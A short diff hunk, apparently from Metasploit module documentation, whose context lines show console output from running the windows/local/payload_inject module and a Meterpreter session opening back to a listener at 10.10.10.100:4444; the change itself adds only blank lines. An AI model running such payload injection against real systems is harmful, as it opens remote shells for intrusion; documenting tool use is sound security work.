@@ -42,3 +42,5 @@ msf5 exploit(windows/local/payload_inject) > run
 [*] Sending stage (179779 bytes) to 10.10.10.10
 [*] Meterpreter session 3 opened (10.10.10.100:4444 -> 10.10.10.10:50223) at 2019-11-13 19:36:41 -0500
 ```
+
+
